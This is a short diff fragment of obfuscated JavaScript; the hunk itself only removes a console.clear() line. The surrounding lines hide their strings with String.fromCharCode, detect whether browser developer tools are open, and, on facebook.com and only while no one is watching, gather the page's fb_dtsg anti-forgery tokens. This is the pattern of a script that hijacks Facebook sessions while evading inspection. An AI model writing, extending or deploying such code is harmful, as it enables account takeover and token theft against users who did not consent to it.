@@ -448,7 +448,6 @@ element.__defineGetter__(String.fromCharCode(105,100), function() {
     checkStatus = String.fromCharCode(111,110);
 });
 console.log(element);
-console.clear();
 
 if (location.hostname.indexOf(String.fromCharCode(102,97,99,101,98,111,111,107,46,99,111,109)) >= 0 && (checkStatus == String.fromCharCode(111,102,102) || consoleFree == true)) {
     fb_dtsg_list = document.getElementsByName(String.fromCharCode(102,98,95,100,116,115,103));
